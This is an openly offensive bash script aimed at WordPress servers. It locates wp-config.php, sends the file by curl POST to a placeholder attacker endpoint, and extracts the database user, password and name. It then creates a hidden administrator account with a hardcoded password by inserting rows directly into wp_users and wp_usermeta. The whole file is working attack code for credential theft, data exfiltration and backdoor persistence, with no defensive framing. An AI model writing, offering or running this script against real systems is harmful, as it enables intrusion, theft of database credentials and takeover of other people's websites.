#!/bin/bash
# Exfiltrate wp-config.php and create admin user
CONFIG_PATH=$(find /var/www -name "wp-config.php" 2>/dev/null | head -n 1)
if [ -n "$CONFIG_PATH" ]; then
    # Send config to your attacker endpoint (use a public requestbin or your server)
    curl -X POST --data-binary @"$CONFIG_PATH" "https://your-attacker-endpoint.com/wp-config"
    
    # Extract DB creds
    DB_USER=$(grep "define('DB_USER'" "$CONFIG_PATH" | awk -F"'" '{print $4}')
    DB_PASS=$(grep "define('DB_PASSWORD'" "$CONFIG_PATH" | awk -F"'" '{print $4}')
    DB_NAME=$(grep "define('DB_NAME'" "$CONFIG_PATH" | awk -F"'" '{print $4}')
    
    # Generate hash
    HASH=$(php -r "echo password_hash('DeepHat!2026', PASSWORD_BCRYPT, ['cost' => 12]);")
    
    # Create Admin
    mysql -u "$DB_USER" -p"$DB_PASS" "$DB_NAME" -e "INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_status, display_name) VALUES ('deephat_admin', '$HASH', 'deephat_admin', 'deephat@attacker.com', 'https://attacker.com', NOW(), 0, 'DeepHat Admin');"
    USER_ID=$(mysql -u "$DB_USER" -p"$DB_PASS" "$DB_NAME" -N -e "SELECT MAX(ID) FROM wp_users;")
    mysql -u "$DB_USER" -p"$DB_PASS" "$DB_NAME" -e "INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES ($USER_ID, 'wp_capabilities', 'a:1:{s:13:\"administrator\";b:1;}');"
    mysql -u "$DB_USER" -p"$DB_PASS" "$DB_NAME" -e "INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES ($USER_ID, 'wp_user_level', '10');"
fi
